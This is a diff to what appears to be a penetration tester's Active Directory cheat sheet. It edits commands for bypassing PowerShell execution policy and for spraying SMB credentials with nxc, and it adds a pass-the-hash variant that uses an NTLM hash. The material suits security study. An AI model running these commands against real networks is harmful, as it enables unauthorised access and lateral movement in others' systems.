@@ -128,9 +128,6 @@ https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/
 
 ```
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
-```
-
-```
 powershell -ep bypass
 ```
 
@@ -322,10 +319,15 @@ Find-LocalAdminAccess -ComputerName (Get-Content .\hosts.txt)
 ```
 ## nxc
 Similar checks using `nxc smb`
+use passwords
 ```
-nxc smb ip.txt -u USER -p PASS -d DOMAIN --continue-on-success
+nxc smb ip.txt -u USER -p PASS --continue-on-success
 ```
 
+use hashes
+```
+nxc smb 192.168.x.x -u USER -H 'NTLM' --continue-on-success 
+```
 # Find Vulnerable GPO
  check for the permissions our current user have over the GPONAME
 ```
